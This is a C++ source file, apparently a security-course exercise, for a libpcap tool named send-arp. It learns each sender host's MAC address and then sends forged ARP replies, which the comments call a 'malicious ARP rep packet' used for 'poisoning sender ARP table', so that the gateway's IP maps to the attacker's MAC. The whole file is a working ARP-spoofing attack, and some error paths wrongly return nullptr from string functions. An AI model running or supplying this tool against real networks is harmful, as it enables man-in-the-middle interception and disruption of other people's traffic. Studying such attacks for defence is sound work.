#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <string>
#include <fstream>

#include <unistd.h>
#include <cstring>
#include <cstdlib>
#include <vector>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)


// include NULL.
constexpr size_t MAC_ADDR_STR_LEN = 18;

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp ens33\n");
}


/**
 * @brief	Get my MAC address as string.
 * 
 * @param	dev_		NIC deivce name.
 * @return	std::string	my MAC address.
 * 
 * @details	read file /sys/class/net/[dev_]/address to get MAC address of NIC device.
 */
std::string GetMyMac(const std::string dev_){
	std::string filePath = "/sys/class/net/" + dev_ + "/address";

	std::ifstream ifr;
	ifr.open(filePath, std::ifstream::in);
	if (!ifr.is_open()){
		fprintf(stderr, "can't open file %s\n", filePath.c_str());
		return "";
	}

	static std::string res;
	std::getline(ifr, res);
	ifr.close();
	
	return res;
}


/**
 * @brief Get target MAC address as string.
 * 
 * @param dev_ NIC deivce name.
 * @param IP_ target IP address.
 * @return std::string target MAC address.
 * 
 * @details	Send ARP req packet to target, get ARP rep packet,
 * 			and get target MAC address from ARP rep packet.
 * 			@pcap_setnonblock used.
 */
std::string GetMac(const char* dev_, const std::string myMac_, const std::string IP_){
	char errbuf[PCAP_ERRBUF_SIZE];

	// modified params to use pcap_next_ex().
	pcap_t* handle = pcap_open_live(dev_, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev_, errbuf);
		return nullptr;
	}

	// make  normal ARP req packet.
	EthArpPacket packetArpReq;

	// broadcast
	packetArpReq.eth_.smac_ = Mac(myMac_);
	packetArpReq.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");

	packetArpReq.eth_.type_ = htons(EthHdr::Arp);
	packetArpReq.arp_.hrd_ = htons(ArpHdr::ETHER);
	packetArpReq.arp_.pro_ = htons(EthHdr::Ip4);
	packetArpReq.arp_.hln_ = Mac::SIZE;
	packetArpReq.arp_.pln_ = Ip::SIZE;
	packetArpReq.arp_.op_ = htons(ArpHdr::Request);
	packetArpReq.arp_.smac_ = Mac(myMac_);

	// custom ip.
	// 0.0.0.0 -> ARP PROBE??
	// tip -> arp_rep's dmac == broadcast??
	packetArpReq.arp_.sip_ = htonl(Ip("1.1.1.1"));

	packetArpReq.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packetArpReq.arp_.tip_ = htonl(Ip(IP_));

	int res = 0;
	struct pcap_pkthdr* header;

	// set nonblock mode.
	// send arp request until receive arp reply from sender.
	pcap_setnonblock(handle, 1, errbuf);
	do{
		sleep(0);

		// send normal ARP req packet.
		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packetArpReq), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			return nullptr;
		}

		// receive packet.
		const u_char* recvPacket;
		res = pcap_next_ex(handle, &header, &recvPacket);
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			return nullptr;
		}

		if (res == 0){
			// no captured packet.
			continue;
		}

		EthArpPacket* ethPacket = (EthArpPacket*)recvPacket;
		if (ethPacket->eth_.type() != EthHdr::Arp){
			// not arp packet.
			continue;
		}

		if (strcasecmp(std::string(ethPacket->eth_.dmac_).c_str(), myMac_.c_str()) != 0){
			// get only packet sent to me.
			continue;
		}
		std::string ret = std::string(ethPacket->arp_.smac_);
		printf("@GetMac: std::string(ethPacket->arp_.smac_).c_str()=%s\n", ret.c_str());
		pcap_close(handle);

		// return target MAC address from ARP rep packet.
		return ret;
	} while (true);
}


int main(int argc, char* argv[]) {
	if (argc < 4 || argc % 2 != 0) {
		usage();
		return -1;
	}

	const int jobNum = (argc - 2) / 2;
	printf("@main: argc=%d jobNum=%d\n", argc, jobNum);
	std::vector<std::string> senderIpList;
	std::vector<std::string> targetIpList;
	for(int i = 2; i < argc; i ++){
		if (i % 2 == 0){
			senderIpList.push_back(argv[i]);
		}
		else{
			targetIpList.push_back(argv[i]);
		}
	}

	const std::string myMac = GetMyMac(argv[1]);
	if (myMac == ""){
		fprintf(stderr, "couldn't get my MAC address\n");
		return -1;
	}
	printf("@main: myMac=%s\n", myMac.c_str());

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	for(int i = 0; i < jobNum; i++){
		std::string senderMac = GetMac(dev, myMac, senderIpList.at(i));
		if (senderMac == ""){
			fprintf(stderr, "couldn't get target MAC address\n");
			return -1;
		}
		printf("@main: senderIP=%s\tsenderMac=%s\n", senderIpList.at(i).c_str(), (senderMac).c_str());

		// generate malicious ARP rep packet.
		EthArpPacket packet;
		packet.eth_.dmac_ = Mac(senderMac);			// Sender MAC
		packet.eth_.smac_ = Mac(myMac);				// My MAC
		packet.eth_.type_ = htons(EthHdr::Arp);
		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Reply);		// gen ARP rep packet.
		packet.arp_.smac_ = Mac(myMac);				// My MAC
		packet.arp_.sip_ = htonl(Ip(targetIpList.at(i)));		// GW IP
		packet.arp_.tmac_ = Mac(senderMac);			// Sender MAC
		packet.arp_.tip_ = htonl(Ip(senderIpList.at(i)));		// Sender IP

		// poisoning sender ARP table.
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
	}


	pcap_close(handle);
}